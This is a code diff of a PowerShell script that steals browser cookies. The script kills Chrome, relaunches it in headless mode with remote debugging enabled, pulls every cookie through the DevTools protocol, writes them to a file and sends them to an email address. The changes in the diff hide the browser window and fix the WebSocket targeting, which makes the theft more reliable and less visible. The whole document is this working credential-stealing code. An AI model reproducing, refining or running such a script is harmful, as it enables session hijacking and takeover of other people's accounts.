@@ -34,6 +34,7 @@ function SendReceiveWebSocketMessage {
 
         while ($true) {
             $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
+            Write-Host $receiveResult
             if ($receiveResult.Result.Count -gt 0) {
                 $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
             }
@@ -54,7 +55,7 @@ Write-Host "`nQuit current Chrome process if it exists.."
 quitx
 Write-Host "Open Chrome with remote debugging port.."
 $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-Start-Process -FilePath $chromePath -ArgumentList "https://google.com", "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort" -PassThru
+Start-Process -FilePath $chromePath -ArgumentList "https://google.com", "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort", "--headless" -PassThru
 
 # Catch all browser cookies
 $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
@@ -64,10 +65,11 @@ $Message = '{"id": 1,"method":"Network.getAllCookies"}'
 
 # Parse cookie data
 Write-Host "`nObtain all cookies.."
-if ($url_capture[0].Length -ge 2) {
-    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message
+Write-Host $url_capture.Length
+if ($url_capture.Length -ge 2) {
+    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[1] -Message $Message
 } else {
-    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture -Message $Message
+    $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[0] -Message $Message
 }
 
 # Quit Chrome
@@ -81,7 +83,6 @@ $response | Out-File -FilePath $outputFile
 Write-Host "Remove heading so only cookies in json format remain.."
 (Get-Content $outputFile | Select-Object -Skip 14) | Set-Content $outputFile
 $cookies = Get-Content $outputFile -Raw
-
 # Sending cookies to mail
 Write-Host "Send cookies to mail:" $toMail
 $cookies = Get-Content $outputFile -Raw 
